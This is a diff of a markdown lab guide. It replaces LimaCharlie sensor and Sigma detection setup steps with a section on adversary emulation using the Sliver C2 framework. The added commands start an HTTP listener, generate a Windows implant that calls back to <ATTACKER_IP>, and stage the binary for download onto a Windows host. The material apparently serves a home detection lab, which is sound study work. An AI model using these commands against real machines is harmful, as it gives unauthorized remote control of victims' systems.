@@ -1,33 +1,32 @@
-Sysmon & Sigma Pipeline Ingestion
+# Adversary Emulation with Sliver C2
+Compile a custom x64 Windows executable beacon payload configured to callback to the Linux host IP over HTTP:
 
-## 1. Artifact Collection Rule:
-
-To ingest low-level Windows operational security events:
-
-1.  Navigate to Artifact Collection in the LimaCharlie left navigation bar.
-     
-<!-- Screenshot Placeholder -->
-> **Screenshot:** <img src="../screenshots/04-artifact-collection.png">
-> **Timestamp:** <a href="https://www.youtube.com/watch?v=du6_Dk7-a-k&t=5m42s"> <img src="https://img.shields.io/badge/-Youtube-CD201F?&style=for-the-badge&logo=youtube&logoColor=white" /></a>
-
-> **Caption:** Adding Artifact rule.
-
-## 4. Sigma Detection Extension
-
-1.  In the upper-right corner of the LimaCharlie console, open Add-ons.
-2.  Select Extensions and search for `ext-sigma`
-3.  Locate the ext-sigma extension (managed open-source Sigma rule pack for telemetry pattern matching).
-4.  Click Subscribe (Free tier) to activate the rule engine.
-
-<!-- Screenshot Placeholder -->
-> **Screenshot:** <img src="../screenshots/03-sigma-ruleset-extension.png">
-> **Timestamp:** <a href="https://www.youtube.com/watch?v=du6_Dk7-a-k&t=6m45s"> <img src="https://img.shields.io/badge/-Youtube-CD201F?&style=for-the-badge&logo=youtube&logoColor=white" /></a>
-
-> **Caption:** Subscribing to the free ext-sigma detection extension.
-   
-## 2. Command Reference
-
-| Command | Purpose | Notes |
-| --------------- | --------------- |--------------- |
-| cd C:\Users\Administrator\Downloads | Navigates to payload/executable staging folder | Run from elevated CMD |
-| lc_sensor.exe -i <KEY> | nstalls LimaCharlie sensor as a background service | Requires valid org installation key |
+## 1. Endpoint Detonation
+* **Service Initialization:**
+  * Managed the system daemon on the Linux attacker machine:
+    ```bash
+    sudo systemctl restart sliver
+    sliver
+    ```
+  * Check all active listeners, allowing you to confirm if your HTTP listener is running.
+      ```bash
+       jobs
+      ```
+ 
+* **Payload Generation:**
+  * Started an HTTP C2 listener on port `80`:
+    ```text
+    [server] sliver > http
+    ```
+      * Default listener on port 80.
+      * Optional flags can be added if needed, such as specifying a port with -l or a domain with --domain.
+        
+  * Generated a custom Windows AMD64 implant executable:
+    ```text
+    [server] sliver > generate --http <ATTACKER_IP> --save /var/www/payloads
+    ```
+    *Output Binary:* `EVERYDAY_BOWTIE.exe` (SHA-256: `65d05836383075be424604df356f14f33d565407cb903419bee27ce59d293c5a`)
+* **Delivery:**
+  * Staged the binary via HTTP web server and downloaded it to `C:\Users\Administrator\Downloads\` on the Windows host.
+ 
+    
